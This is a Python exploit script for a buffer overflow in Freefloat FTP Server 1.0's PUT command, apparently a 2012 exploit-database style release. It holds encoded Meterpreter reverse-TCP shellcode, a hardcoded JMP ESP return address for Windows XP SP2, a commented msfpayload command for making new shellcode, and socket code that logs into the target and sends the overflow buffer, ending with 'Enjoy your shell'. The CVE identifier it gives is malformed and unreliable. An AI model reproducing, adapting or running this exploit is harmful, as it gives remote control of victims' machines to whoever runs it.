#!/usr/bin/python
 
import socket
 
def Overflow():
 
    print "[!!!!] INSTRUCTIONS:\n\n[*] Use the commeneted out msfpayload 
command to generate shellcode for your environment and replace the 
shellcode variable with your shellcode\n[*] Make sure you start a proper 
listener if using reverse shell\n\n"
    server = raw_input("\n[*] Please enter the IP address of a server 
you wish to exploit:\n\n>")
    port = int(21)
    user = raw_input("\n[*] Please enter a username for the FTP 
server:\n\n>")
    password = raw_input("\n[*] Please enter a password for 
username:\n\n>")
    cmd = "put "
    nopsled = "\x90" * 32
    junk = "\x90" * 247
    junk2 = "\x90" * 65
    ret_addr = "\xED\x1E\x94\x7C" #7C941EED - FFE4 - JMP ESP <NTDLL.dll 
XP sp2> - Dont forget little endian!
 
    #msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.117 
LPORT=2107 EXITFUNC=thread R | msfencode -c 1 -e x86/shikata_ga_nai -b 
"\x00\x0a\x0d\x20\x7b" R
    shellcode = 
("\xdb\xc3\xd9\x74\x24\xf4\xbd\x06\xbd\x1f\xaa\x5f\x33\xc9" +
    "\xb1\x49\x31\x6f\x19\x83\xef\xfc\x03\x6f\x15\xe4\x48\xe3" +
    "\x42\x61\xb2\x1c\x93\x11\x3a\xf9\xa2\x03\x58\x89\x97\x93" +
    "\x2a\xdf\x1b\x58\x7e\xf4\xa8\x2c\x57\xfb\x19\x9a\x81\x32" +
    "\x99\x2b\x0e\x98\x59\x2a\xf2\xe3\x8d\x8c\xcb\x2b\xc0\xcd" +
    "\x0c\x51\x2b\x9f\xc5\x1d\x9e\x0f\x61\x63\x23\x2e\xa5\xef" +
    "\x1b\x48\xc0\x30\xef\xe2\xcb\x60\x40\x79\x83\x98\xea\x25" +
    "\x34\x98\x3f\x36\x08\xd3\x34\x8c\xfa\xe2\x9c\xdd\x03\xd5" +
    "\xe0\xb1\x3d\xd9\xec\xc8\x7a\xde\x0e\xbf\x70\x1c\xb2\xc7" +
    "\x42\x5e\x68\x42\x57\xf8\xfb\xf4\xb3\xf8\x28\x62\x37\xf6" +
    "\x85\xe1\x1f\x1b\x1b\x26\x14\x27\x90\xc9\xfb\xa1\xe2\xed" +
    "\xdf\xea\xb1\x8c\x46\x57\x17\xb1\x99\x3f\xc8\x17\xd1\xd2" +
    "\x1d\x21\xb8\xba\xd2\x1f\x43\x3b\x7d\x28\x30\x09\x22\x82" +
    "\xde\x21\xab\x0c\x18\x45\x86\xe8\xb6\xb8\x29\x08\x9e\x7e" +
    "\x7d\x58\x88\x57\xfe\x33\x48\x57\x2b\x93\x18\xf7\x84\x53" +
    "\xc9\xb7\x74\x3b\x03\x38\xaa\x5b\x2c\x92\xc3\xf1\xd6\x75" +
    "\x2c\xad\xd8\xf0\xc4\xaf\xda\xf2\x2f\x26\x3c\x68\x40\x6e" +
    "\x96\x05\xf9\x2b\x6c\xb7\x06\xe6\x08\xf7\x8d\x04\xec\xb6" +
    "\x65\x61\xfe\x2f\x86\x3c\x5c\xf9\x99\xeb\xcb\x06\x0c\x17" +
    "\x5a\x50\xb8\x15\xbb\x96\x67\xe6\xee\xac\xae\x72\x51\xdb" +
    "\xce\x92\x51\x1b\x99\xf8\x51\x73\x7d\x58\x02\x66\x82\x75" +
    "\x36\x3b\x17\x75\x6f\xef\xb0\x1d\x8d\xd6\xf7\x82\x6e\x3d" +
    "\x06\xff\xb8\x78\x8c\x09\xcf\x68\x4c")
 
    #Fuzz Buffer
    #buffer = "PUT " + "\x90" * 720
 
    #Exploit Buffer
    buffer = cmd + junk + ret_addr + nopsled + shellcode + junk2
 
    print "\n[*] Sending payload in attempt to overflow buffer\n[*] Your 
payload size is %s\n" % len(buffer)
 
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server,port))
 
        data = s.recv(1024)
        print "[*] %s" %data
 
        s.send("user " + user + "\r\n")
 
        data = s.recv(1024)
        print "[*] %s" %data
 
        s.send("pass " + password + "\r\n")
 
        data = s.recv(1024)
        print "[*] %s" %data
 
        s.send(buffer+"\r\n")
 
        s.close()
        print "\nData was sent. Enjoy your shell\n"
 
    except:
        print "\n\n[!!!!] There was an error connecting to the server 
and sending your buffer[!!!!] Please check the following...\n\n[*] 
Supplied IP address\n[*] Username and Password\n[*] Is your target is 
online and running FreeFloat FTP server\n\n"
 
 
def main():
 
    print "\n\n# Title************************Freefloat FTP Server PUT 
Command Buffer Overflow\n# Discovered and Reported******22nd of 
September, 2012\n# Discovered/Exploited By******Jacob 
Holcomb/Gimppy042\n# Software 
Vendor**************http://www.freefloat.com/\n# CVE for PUT 
Overflow*********CVE-2012-510\n# 
Exploit/Advisory*************http://infosec42.blogspot.com/\n# 
Software*********************Freefloat FTP Server Version 1.0\n# Tested 
Platform**************Windows XP Professional SP2\n# 
Date*************************22/09/2012\n\n"
 
    contin = str(None)
 
    while contin != "yes":
        contin = raw_input("\n[*] Please review the security advisory 
before proceeding to affirm this exploit is for your target[*]\nWould 
you like to continue?\n\n>")
        if contin == "no":
            break
        elif contin == "yes":
            break
        elif contin != "yes" or "no":
            print "\n\n[*] You responded with %s. Please respond with 
yes or no!\n\n"% contin
 
    if contin == "yes":
        Overflow()
    elif contin == "no":
        print "\n[!!!!] Hmmm..Guess you downloaded the wrong 
exploit...Back to scanning and enumeration [!!!!]\n"
 
 
 
#Top-level script environment
 
if __name__ == "__main__":
 
    main()
